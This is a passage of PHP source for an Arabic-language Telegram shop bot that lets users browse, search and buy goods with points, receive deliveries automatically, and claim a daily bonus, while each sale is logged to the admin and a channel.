$cs = $sales['sales'][$codee]['caption'];
$ps = $sales['sales'][$codee]['price'];
$ph = $sales['sales'][$codee]['photo'];
if(is_numeric($sales['sales'][$codee]['numbers'])){
$n = $sales['sales'][$codee]['numbers'];
}else{
$n = "♾";
}
if($stingggg['saless'] == 'on'){
$a = "الكميه : $n ♻";
}else{
$a = "";
}
bot('sendphoto',[
'chat_id'=>$chat_id,
'photo'=>$ph,
'caption'=>"
اسم السلعه 💌 :  $ns
وصف السلعه 📄 : $cs
سعر السلعه :  $ps
طريقة التسليم : تلقائي ✨
$a",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"شراء السلعة 🔥",'callback_data'=>$codee]],
[['text'=>"السابق",'callback_data'=>"num&&s".$s]],
[['text'=>"رجوع 🔙",'callback_data'=>"alllslaa"]],
],
]),
]);
}
}
if(preg_match("/num&&s(.*)/",$data,$r)){
$num = $r[1];
$t = $num+1;
$s = $num-1;
$codee = $sales['allcodes'][$num];
$ns = $sales['sales'][$codee]['name'];
$cs = $sales['sales'][$codee]['caption'];
$ps = $sales['sales'][$codee]['price'];
$ph = $sales['sales'][$codee]['photo'];
if(is_numeric($sales['sales'][$codee]['numbers'])){
$n = $sales['sales'][$codee]['numbers'];
}else{
$n = "♾";
}
if($stingggg['saless'] == 'on'){
$a = "الكميه : $n ♻";
}else{
$a = "";
}
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
$send = bot('sendphoto',[
'chat_id'=>$chat_id,
'photo'=>$ph,
'caption'=>"
اسم السلعه 💌 :  $ns
وصف السلعه 📄 : $cs
سعر السلعه :  $ps
طريقة التسليم : تلقائي ✨
$a",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"شراء السلعة 🔥",'callback_data'=>$codee]],
[['text'=>"السابق",'callback_data'=>"num&&s".$s],['text'=>"التالي",'callback_data'=>"num&&t".$t]],
[['text'=>"رجوع 🔙",'callback_data'=>"alllslaa"]],
],
]),
]);
if($send->ok !== true){
$num = 0;
$t = $num+1;
$s = $num-1;
$codee = $sales['allcodes'][$num];
$ns = $sales['sales'][$codee]['name'];
$cs = $sales['sales'][$codee]['caption'];
$ps = $sales['sales'][$codee]['price'];
$ph = $sales['sales'][$codee]['photo'];
if(is_numeric($sales['sales'][$codee]['numbers'])){
$n = $sales['sales'][$codee]['numbers'];
}else{
$n = "♾";
}
if($stingggg['saless'] == 'on'){
$a = "الكميه : $n ♻";
}else{
$a = "";
}
bot('sendphoto',[
'chat_id'=>$chat_id,
'photo'=>$ph,
'caption'=>"
اسم السلعه 💌 :  $ns
وصف السلعه 📄 : $cs
سعر السلعه :  $ps
طريقة التسليم : تلقائي ✨
$a️",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"شراء السلعة 🔥",'callback_data'=>$codee]],
[['text'=>"التالي",'callback_data'=>"num&&t".$t]],
[['text'=>"رجوع 🔙",'callback_data'=>"alllslaa"]],
],
]),
]);
}
}
 if($data == 'salessyhya'){
 if($stingggg['saless'] == 'on'){
$ajj = "الكميه ♻️";
}else{
$ajj = "";
}
  $reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>"$ajj",'callback_data'=>'s'],['text'=>'السعر 💰','callback_data'=>'s'],['text'=>'إسم السلعة 🏷️','callback_data'=>'s']];
  foreach($sales['sales'] as $code => $sale){
  if($ex[1]==$sales["sales"][$code]["type"])	{
    $ap=$sales["sales"][$code]["apps"];
 $a= $sales["sales"][$code]["numbers"];
  if($a == 'end'){
  $a="♾️";
  }
   if($stingggg['saless'] == 'on'){
$ajjj = "$a";
}else{
$ajjj = "";
}
   $reply_markup['inline_keyboard'][] = [['text'=>"$ajjj",'callback_data'=>$code],['text'=>$sale['price'],'callback_data'=>$code],['text'=>$sale['name'],'callback_data'=>$code]];
  }}
if($sales[$chat_id]['collect'] == null){
   $sales[$chat_id]['collect'] = 0;
   save($sales);
  }
$reply_markup['inline_keyboard'][] = [['text'=>'بحث عن سلعه 🔍','callback_data'=>'search'],['text'=>'السلع التي يمكنك شرائها','callback_data'=>'prsla']];
$reply_markup['inline_keyboard'][] = [['text'=>'العودة إلى قائمة السلع 🔙','callback_data'=>'alllslaa']];
  $reply_markup = json_encode($reply_markup);
  bot('editMessageText',[	

   'chat_id'=>$chat_id,
   'message_id'=>$message_id,
   'text'=>'- العروض التي يقدمها البوت ، 🔥
~ عدد نقاطك الآن: '.$sales[$chat_id]['collect'],
   'reply_markup'=>($reply_markup)
  ]);
  $sales[$chat_id]['mode'] = null;
   save($sales);
   exit;
 }

   elseif($data == 'yes'){
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
  $price = $sales['sales'][$sales[$chat_id]['mode']]['price'];
$name = $sales['sales'][$sales[$chat_id]['mode']]['name'];
$file=$sales['sales'][$sales[$chat_id]['mode']]['file'];
$file2=$sales['sales'][$sales[$chat_id]['mode']]['file2'];
$mah = $sales[$chat_id]['numbercount'];
  bot('sendmessage',[
  "chat_id"=>$chat_id,
    "text"=>"تم قبول طلبك ☑️
\nجاري تجهيز سلعة الإرسال 😃\nإنتضر ثـ¹ـانـيـة حتى تستلم طلبك 📦",
  ]);
  if($file2=="text"){
  	bot("sendmessage",[
  "chat_id"=>$chat_id,
  "$file2"=>$file
  ]);
    bot('sendmessage',[
  "chat_id"=>$chat_id,
    "text"=>"📦 « إيـصـآل طـلـب » 📦
شـكـراً لـإ سـتـخـدامـك الـبـ🤖ـوت الـخـاص بـنـا ??
بحال واجهتك مشاكل في استلام سلعه قم بمراسلة الادمن  : @$JAMALJO
",
  "message_id"=>$message_id
  ]);
  $sttings["sal3h"]+=1;
file_put_contents("JAMALGG.json",json_encode($sttings));
  }else{	
bot("send$file2",[
  "chat_id"=>$chat_id,
  "$file2"=>$file
  ]);
bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"📦 « إيـصـآل طـلـب » 📦
شـكـراً لـإ سـتـخـدامـك الـبـ🤖ـوت الـخـاص بـنـا 🤍
بحال واجهتك مشاكل في استلام سلعه قم بمراسلة الادمن  : @$JAMALJO
",
  	]);
  	$sttings["sal3h"]+=1;
file_put_contents("JAMALGG.json",json_encode($sttings));
 } 
$dayy_s = array("Sat","Sun","Mon","Tue","Wed","Thu","Fri");
 $dayy_s1 = array("السبت","الأحد","الإثنين","الثلاثاء","الأربعاء","الخميس","الجمعة");
$dayy_s2 = date('D');
$dayy = str_replace($dayy_s, $dayy_s1, $dayy_s2);
date_default_timezone_set('Asia/Jordan');
$time = date('h:i a');
$year = date('Y');
$month = date('n');
$day = date('j');
    $userbot = "{$getMe->username}";
    $userb = strtoupper($userbot);
    	bot('sendmessage',[
	'chat_id'=>$sss,
	'text'=>"
- تم تسـ📦ـليم طلب جديد ✅
- من ماركت : [@$bott] 🤍

🏷 ¦ السلعة :- *$name* 📱
💰 ¦ السعر :- *$price*
📆 ¦ التاريخ :- *$dayy - $year/$month/$day*

- معلومات المُشتري 👤 :-
🏷 ¦ الاسم :- [$nammee](tg://user?id=$chat_id)
🆔 ¦ الأيدي :- $chat_id", 
'parse_mode'=>"MarkDown",
	'reply_markup'=>json_encode([
                   'inline_keyboard'=>[
				[
['text'=>"بوت الماركت 🤖",'url'=>"https://t.me/$bott?start"]
   ],
   
                     ]
               ])
  	]);
  	$rm30 = $sttings["sal3h"];
  bot('sendmessage',[
   'chat_id'=>$admin,
   'text'=>"👩🏻‍💻 ¦ مرحبا مطوري 👋🏻
وتم تسليم السلعه تلقائيا 🛒
🛒 ¦ قم بشراء $name بسعر $price 
• ┉ • ┉ •
🎫 ¦ الأيدي: $chat_id
• ┉ • ┉ •
لدخول على صفحته اضغط على الرابط ⛓
 tg://openmessage?user_id=$chat_id
• ┉ • ┉ •
📌 ¦ المعرف إن وجد: @$user
• ┉ • ┉ •
⏳ ¦ $time
-"
  ]);
  
  $sales[$chat_id]['collect'] -= $price;
  if($sales['sales'][$sales[$chat_id]['mode']]['numbers'] != 'end'){
  if($sales['sales'][$sales[$chat_id]['mode']]['numbers'] == 0 or $sales['sales'][$sales[$chat_id]['mode']]['numbers'] == 1){
  	unset($sales['sales'][$sales[$chat_id]['mode']]);
  }else{
  	$sales['sales'][$sales[$chat_id]['mode']]['numbers'] -=1;
  }
  }$sales[$chat_id]['mode'] = null;
  save($sales);
  exit;
 } else {
   if($data == 's') { exit; }
   $price = $sales['sales'][$data]['price'];
   $name = $sales['sales'][$data]['name'];
   $caption = $sales['sales'][$data]['caption'];
   if($price != null){
    if($price <= $sales[$chat_id]['collect']){
     bot('sendphoto',[
      'chat_id'=>$chat_id,
      'photo'=>$sales['sales'][$data]['photo'],
      'caption'=>"
اسم السلعه 💌 :  $name
وصف السلعه 📄 : $caption
سعر السلعه :  $price
طريقة التسليم : تلقائي ✨
💢¦ هل أنت متأكد أنك تريد شراء",
   'reply_markup'=>json_encode([
     'inline_keyboard'=>[
        [['text'=>'- تاكيد الشراء، ✅','callback_data'=>"yes"],['text'=>'- لا اريد الشراء 📛','callback_data'=>"alllslaa"]],
       ] 
      ])
     ]);
     $sales[$chat_id]['mode'] = $data;
     save($sales);
     exit;
    } else {
     bot('answercallbackquery',[
      'callback_query_id' => $update->callback_query->id,
'text'=>"نقاطك غير كافية لشراء هذا السلعة 🚫
الإسم السلعة :$name 🔖
سعر السلعة :$price نقطة 💰 
وصف السلعه 📄 : $caption
طريقة التسليم : تلقائي ✨
عدد نقاطك : ".$sales[$chat_id]['collect']." نقطة 💸",
      'show_alert'=>true
     ]);
    }
   }
 }
if($data=="search"){
bot('EditMessageText',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
• اكتب اسم السعة المراد البحث عنها  🌐
",
'parse_mode' => "MarkDown",
'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>" رجوع  🔙",'callback_data'=>"salessyhya"]],
    ] 
   ])
  ]);
  $sales[$chat_id]["mode"]="search";
  save($sales);
  exit;
}
if($sales[$chat_id]["mode"]=="search"){
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
جاري البحث...♻️
",
'reply_to_message_id'=>$message->message_id, 
  ]);
sleep(2);
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
 if($stingggg['saless'] == 'on'){
$ajj = "الكميه ♻️";
}else{
$ajj = "";
}
  $reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>"$ajj",'callback_data'=>'s'],['text'=>'السعر 💰','callback_data'=>'s'],['text'=>'إسم السلعة 🏷️','callback_data'=>'s']];
  foreach($sales['sales'] as $code => $sale){
  if(preg_match("/$text/",$sale["name"])||preg_match("/$text/",$name)){
  $co=$sales["sales"][$code]["country"];
  $ap=$sales["sales"][$code]["apps"];
  $a= $sales["sales"][$code]["numbers"];
  if($a == 'end'){
  $a="♾️";
  }
   if($stingggg['saless'] == 'on'){
$ajjj = "$a";
}else{
$ajjj = "";
}
   $reply_markup['inline_keyboard'][] = [['text'=>"$ajjj",'callback_data'=>$code],['text'=>$sale['price'],'callback_data'=>$code],['text'=>$sale['name'],'callback_data'=>$code]];
  }}
if($sales[$chat_id]['collect'] == null){
   $sales[$chat_id]['collect'] = 0;
   save($sales);
  }
$reply_markup['inline_keyboard'][] = [['text'=>'بحث عن سلعه 🔍','callback_data'=>'search'],['text'=>'السلع التي يمكنك شرائها','callback_data'=>'prsla']];
$reply_markup['inline_keyboard'][] = [['text'=>'العودة إلى قائمة السلع 🔙','callback_data'=>'alllslaa']];
  $reply_markup = json_encode($reply_markup);
  bot('sendmessage',[
   'chat_id'=>$chat_id,
   'message_id'=>$message_id,
   'text'=>'
🔥 -: اهلا عزيزي
🔍 :- اليك السلع التي تبحث عنها
',
   'reply_markup'=>($reply_markup)
  ]);
  $sales[$chat_id]["mode"]="";
  save($sales);
  exit;
}
if($data=="prsla"){
bot('editmessagetext',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
جاري البحث...♻️
",
'reply_to_message_id'=>$message->message_id, 
]);
sleep(2);
bot('deletemessage',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
 if($stingggg['saless'] == 'on'){
$ajj = "الكميه ♻️";
}else{
$ajj = "";
}
  $reply_markup = [];
  $reply_markup['inline_keyboard'][] = [['text'=>"$ajj",'callback_data'=>'s'],['text'=>'السعر 💰','callback_data'=>'s'],['text'=>'إسم السلعة 🏷️','callback_data'=>'s']];
  foreach($sales['sales'] as $code => $sale){
  if($sale['price'] <= $sales[$chat_id2]['collect']){
  $co=$sales["sales"][$code]["country"];
  $ap=$sales["sales"][$code]["apps"];
  $a= $sales["sales"][$code]["numbers"];
  if($a == 'end'){
  $a="♾️";
  }
   if($stingggg['saless'] == 'on'){
$ajjj = "$a";
}else{
$ajjj = "";
}
   $reply_markup['inline_keyboard'][] = [['text'=>"$ajjj",'callback_data'=>$code],['text'=>$sale['price'],'callback_data'=>$code],['text'=>$sale['name'],'callback_data'=>$code]];
  }}
if($sales[$chat_id]['collect'] == null){
   $sales[$chat_id]['collect'] = 0;
   save($sales);
  }
$reply_markup['inline_keyboard'][] = [['text'=>'بحث عن سلعه 🔍','callback_data'=>'search']];
$reply_markup['inline_keyboard'][] = [['text'=>'العودة إلى قائمة السلع 🔙','callback_data'=>'alllslaa']];
  $reply_markup = json_encode($reply_markup);
  bot('sendmessage',[
   'chat_id'=>$chat_id,
   'message_id'=>$message_id,
   'text'=>'
🔥 -: اهلا عزيزي
🔍 :- اليك السلع التي يمكنك شرائها
',
   'reply_markup'=>($reply_markup)
  ]);
  $sales[$chat_id]["mode"]="";
  save($sales);
  exit;
}

$fromid = $update->callback_query->from->id;
if($data == "kk"){ 
  	if($stingggg['dayis'] == 'on'){
  if(!in_array($fromid,$day)){
    bot('answercallbackquery',[
        'callback_query_id'=>$update->callback_query->id,
'text'=>"لقد ربحت $hadehdayj 💰
 يمكنك الربح مجدد بعد منتصف الليل 🕛", 
 'show_alert'=>true,
]); 
$sales[$fromid]['collect'] += $hadehdayj;
save($sales);
file_put_contents($d.'.txt',$fromid."\n",FILE_APPEND);
	$sttings["hdeh1"]+=1;
file_put_contents("JAMALGG.json",json_encode($sttings));
}else{
bot('answercallbackquery',[
        'callback_query_id'=>$update->callback_query->id,
 'text' =>" حاول مجدداً بعد منتصف الليل 🕛 ",
        'show_alert'=>true,
]);
}
}
}

//Bot File Share by [ @Sherif_Sami - @php_d - @BlIJJ ]
//Join Channel >>> @Sherif_World
//Join Channel >>> @M_M_D74
//🚷

$tc = $update->message->chat->type;
if($tc == 'group' or $tc == 'supergroup'){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"لاتضيفني",
]);
bot('LeaveChat',[
'chat_id'=>$chat_id,
'message_id'=>$message_id,
]);
} 
?> 
